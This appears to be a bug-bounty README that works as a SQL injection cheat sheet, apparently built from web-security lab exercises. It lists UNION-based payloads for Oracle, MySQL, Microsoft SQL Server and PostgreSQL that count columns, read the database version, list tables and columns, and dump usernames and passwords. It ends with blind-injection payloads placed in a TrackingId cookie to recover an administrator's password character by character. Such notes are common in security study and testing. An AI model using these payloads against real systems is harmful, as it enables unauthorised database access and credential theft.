# Bug-Bounty
This is all about web &amp; bugbounty
<h1>SQLI</h1>
<pre>(1) Determine the number of columns =>
   i)  ' order by 3 -- 
   ii) 'order by 3# 


(2) Determine the data types of the columns =>  
   i) ' UNION SELECT 'a', 'a' from DUAL-- -> here is a built-in table on Oracle called dual which can be used for this purpose
   ii) ' UNION SELECT 'a', 'a'#


(3) Output the version of the database => 
  i) ' UNION SELECT banner, NULL from v$version-- (Oracle) --> The banner displays the database release and version number AND The version information is stored in a table called v$version.
  ii) ' UNION SELECT @@version, NULL# (Microsoft ,MySql)
  iii)' UNION SELECT version(), NULL-- (postgresql)
  
(4) Output the list of table names in the database

   i) ' UNION SELECT table_name, NULL FROM information_schema.tables--  (postgresql)
   ii) ' UNION SELECT table_name NULL FROM all_tables-- (oracle)
 
(5) Output the column names of the table 

    i) ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_xacgsm'-- (postgresql)
    ii) ' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name= 'USERS_ABCDEF'-- (oracle)
    
(6) Output the usernames and passwords

    i) ' UNION select username_pxqwui, password_bfvoxs from users_xacgsm--
    ii) ' UNION SELECT NULL,username||'~'||password FROM users--(for retrieving multiple values in a single column)



7)Blind SQl->

   i)Modify the TrackingId cookie, changing it to:
     TrackingId=xyz' AND '1'='1
   ii)TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
   iii)'and (select 'a' from users where username ='administrator')='a'--
   iV)'and (select 'a' from users where username ='administrator' AND            
      LENGTH(password)>1)='a'--
   v)' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='q'--
</pre>
